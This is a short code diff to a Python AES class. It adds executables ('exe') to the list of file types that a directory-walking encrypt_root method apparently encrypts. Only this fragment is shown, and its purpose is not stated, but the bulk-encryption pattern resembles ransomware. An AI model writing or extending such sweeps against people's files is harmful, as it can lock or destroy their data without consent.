@@ -7,7 +7,7 @@ class AES:
     def __init__(self, key):
         self.key = key
         self.buffer_size = 64 * 1024
-        self.file_targets = ['txt', 'img', 'png', 'jpg']
+        self.file_targets = ['txt', 'img', 'png', 'jpg', 'exe']
     
     def encrypt_root(self, root_dir):
         for root, _, files in os.walk(root_dir):
